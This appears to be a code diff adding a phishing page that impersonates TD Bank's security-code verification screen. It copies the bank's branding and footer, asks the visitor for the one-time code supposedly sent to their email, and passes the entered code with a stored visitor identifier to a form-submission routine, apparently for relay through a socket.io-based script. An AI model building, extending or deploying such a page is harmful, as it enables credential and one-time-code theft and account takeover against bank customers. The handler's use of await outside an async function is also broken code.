@@ -1,0 +1,386 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Verification</title>
+  <link rel="icon" href="/images/favicon.ico" type="image/x-icon">
+  	
+  <link rel="stylesheet" href="assets/style.css">
+  <script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js'></script>
+  <script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.2.1/css/fontawesome.min.css" integrity="sha384-QYIZto+st3yW+o8+5OHfT6S482Zsvz2WfOzpFSXMF9zqeLcFV0/wlZpMtyFcZALm" crossorigin="anonymous">
+    <style>
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+      background-color: #f9f9f9;
+      background-image: none;
+    }
+    
+    h1 {
+      color: #006400;
+      font-size: 1.6em;
+      margin-bottom: 5px;
+      text-align:left!important;
+      align-self: center;
+    }
+    .form-wrapper {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+    .form-section {
+      margin-bottom: 30px;
+      width: 100%;
+      max-width: 500px;
+    }
+    .input-group {
+      margin-bottom: 30px;
+      position: relative;
+    }
+    .input-group input {
+      width: 100%;
+      padding: 12px 50px 12px 12px; 
+      font-size: 1em;
+      border: 2px solid #ccc;
+      box-sizing: border-box;
+    }
+    
+    .input-group input:focus {
+    border-bottom: 4px solid #006400;
+    outline: none;
+}
+
+    .error {
+      border-bottom: 4px solid #ae1100 !important;
+    }
+
+    input:focus {
+      border-bottom: 4px solid green;
+      outline: none;
+    }
+
+    .input-group .eye-toggle {
+      position: absolute;
+      top: 50%;
+      right: 15px;
+      transform: translateY(-50%);
+      cursor: pointer;
+      font-size: 0.8em;
+      color: #006400;
+    }
+    
+    .otp-error {
+    color: #ae1100;
+    margin-top: 5px;
+    font-size: 13px;
+    font-weight: 500; 
+    display: none;
+    align-items: center;
+    gap: 6px;                    /* space between icon and text */
+}
+
+/* Exclamation mark in circle */
+.otp-error::before {
+    content: "\f06a";            /* Font Awesome "exclamation-circle" */
+    font-family: "Font Awesome 5 Free";
+    font-weight: 900;
+    font-size: 15px;
+    color: #ae1100;
+}
+    
+    /* FLOAT EFFECT */
+
+.input-group input:focus + label,
+.input-group input:valid + label {
+    top: 5px;
+    left: 12px;
+    font-size: 0.75em;
+    color: #006400;
+}
+
+    .checkbox-group {
+      display: flex;
+      align-items: center;
+      margin-bottom: 30px;
+    }
+    .checkbox-group input[type="checkbox"] {
+      width: 20px;
+      height: 20px;
+      accent-color: #006400;
+      margin-right: 10px;
+    }
+    .checkbox-group label {
+      font-size: 1.2em;
+    }
+    button {
+      width: 100%;
+      max-width: 215px; 
+      padding: 12px;
+      font-size: 1em; 
+      background-color: green;
+      border: none;
+      color: #fff;
+      border-radius: 2px;
+      cursor: not-allowed; 
+      margin: 0 auto;
+      display: block;
+    }
+    button.active {
+      background-color: #006400;
+      cursor: pointer;
+    }
+    .links {
+      margin-top: 30px;
+    }
+    a {
+      color: #006400;
+      text-decoration: none;
+      font-size: 1em;
+      font-weight: bold;
+      margin-bottom: 25px;  
+      display: flex;
+      align-items: center;
+    }
+    .info {
+      margin-top: 20px;
+      font-size: 1em;
+      text-align: left;
+      color: #333;
+    }
+    .info strong {
+      color: #006400;
+    }
+    .forgot-password{
+    display:none;
+    }
+    .forgot-password-mobile{
+    display: flex;
+    }
+    input:disabled, button:disabled {
+    border: 2px solid #ccc !important; 
+    background-color: #f9f9f9;
+    color: #888;
+	}
+    /* Desktop styles */
+    @media (min-width: 768px) {
+    .footer-links{
+    display:flex;
+    justify-content: center;
+    align-items:center;
+    }
+    .footer-middle{
+    display: none!important;
+    }
+    }
+    }
+  </style>
+  <style>
+  
+  
+  .label{ 
+  display: block;
+  font-size:14px;  
+  font-weight: 450;
+  padding-bottom:10px!important;
+  
+  }
+</style> 
+</head>
+<body>
+  <div class="header">
+    <img src="/images/logo.png" alt="Logo">  
+    <div class="right-section">
+      <img src="/images/usericon.png" alt="user" />
+      <span>Log in</span>
+    </div>
+  </div>
+  <div class="container">
+    <div class="form-wrapper"> 
+        <h1>Enter Security Code </h1>  
+        <hr style="width:250px;">      
+        	<h3 style="margin-bottom:30px; font-weight:400">Your one time security code was sent <span id="phone-wrap">to your <strong>Email address </strong>attached to this account</span></h3>
+        	 
+        	<p style="margin-bottom:35px;"> This code will expire in a few minutes</p>
+        <div id="form" class="form-section">
+
+            <!-- Phone Number -->
+            <div class="input-group">
+                <label class="label" for="phone">Enter Security Number</label>
+                <input type="tel" name="otp" class="otp-input" id="otp" placeholder="Type code here">
+                	<div class="otp-error"> </div>
+            </div>
+            
+            
+
+            <!-- Log In Button -->
+            <button id="continue-btn" type="submit" disabled>Enter</button>
+
+            <!-- Forgot Username/Password -->
+            <a href="#" class="forgot-password">Forgot username and/or password?</a>
+        </div>
+    </div>
+</div>
+  <!-- Footer Section -->
+<!-- Footer Section -->
+<footer>
+
+    <div class="footer-container">
+
+      <div class="footer-top">
+
+        <div class="p"
+             style="white-space: nowrap; color:green">
+
+          Questions?
+          <span style="color:green; font-weight:bold;">
+            Contact us
+          </span>
+
+        </div>
+
+        <hr class="footer-divider">
+
+      </div>
+
+      <div class="footer-middle">
+        <p>
+          <a href="#">Get the app</a>
+        </p>
+      </div>
+
+      <div class="footer-links">
+
+        <a href="#">Help</a>
+        <a href="#">Terms of Use</a>
+        <a href="#">Security</a>
+        <a href="#">Privacy</a>
+        <a href="#">California Privacy</a>
+        <a href="#">Bank Deposits FDIC Insured</a>
+        <a href="#">Online Advertising</a>
+
+      </div>
+
+      <div class="footer-investment">
+
+        <div class="investment-box">
+
+    <div class="investment-row">
+        SECURITIES AND INVESTMENTS
+    </div>
+
+    <div class="investment-row">
+        Not FDIC Insured
+    </div>
+
+    <div class="investment-row">
+        No Bank Guarantee
+    </div>
+
+    <div class="investment-row">
+        May Lose Value
+    </div>
+
+</div>
+
+      </div>
+
+      <div class="footer-bottom">
+
+        <p>
+          Registered Investment Advisory, Securities and Brokerage
+          services are offered through TD Private Client Wealth,
+          LLC, member FINRA/SIPC.
+        </p>
+
+        <p>
+          &copy; 2024 TD Bank, N.A. All Rights Reserved
+        </p>
+
+      </div>
+
+    </div>
+
+  </footer>
+<script src="assets/emit.js"></script> 
+<script>
+    document.addEventListener('DOMContentLoaded', () => {
+        const inputs = document.querySelectorAll('.input-group input');
+        const submitButton = document.getElementById('continue-btn');
+
+        // Function to check all inputs and enable/disable the button
+        const checkAllInputs = () => {
+            const allFilled = Array.from(inputs).every(input => input.value.trim() !== '');
+            submitButton.disabled = !allFilled;
+        };
+
+        // Add blur event listeners to inputs
+        inputs.forEach(input => {
+            input.addEventListener('blur', (event) => {
+                const inputElement = event.target;
+                const errorDivId = `${inputElement.id}-error`;
+
+                // Remove existing error message if any
+                let existingError = document.getElementById(errorDivId);
+                if (existingError) {
+                    existingError.remove(); 
+                }
+ 
+                // If input is empty, add an error message
+                if (inputElement.value.trim() === '') {
+                    const errorDiv = document.createElement('div');
+                    errorDiv.id = errorDivId;     
+                    errorDiv.style.fontWeight = "500";
+					errorDiv.style.margin = "4px";
+                    errorDiv.style.color = '#ae1100'; 
+                    errorDiv.style.fontSize = '13px';
+                    errorDiv.textContent = `Please ${inputElement.placeholder}`;
+                    inputElement.parentNode.appendChild(errorDiv);   
+                    inputElement.classList.add('error');
+                    
+                }
+
+                // Check if all inputs are filled
+                checkAllInputs();
+            });
+
+            // Remove the error message as the user starts typing
+            input.addEventListener('input', () => {
+                const errorDiv = document.getElementById(`${input.id}-error`);
+                if (errorDiv) {
+                    errorDiv.remove();
+                    input.classList.remove('error');
+                }
+                checkAllInputs();
+            });
+        });
+    });
+    
+    $(document).ready(function () {
+    $('#continue-btn').click(function (e) {
+        e.preventDefault();
+
+        let userinfo = {}; 
+        let visitor = sessionStorage.getItem('visitor');
+        
+        $('#form input').each(function () {
+            let inputName = $(this).attr('name');
+            let inputValue = $(this).val();
+            
+            if (inputName) {
+                userinfo[inputName] = inputValue;
+            }
+        });
+
+        userinfo['visitor'] = visitor;
+        console.log(userinfo); 
+        
+        await submitFormData(userinfo);
+    });
+});
+</script> 
+
+</body>
+</html> 
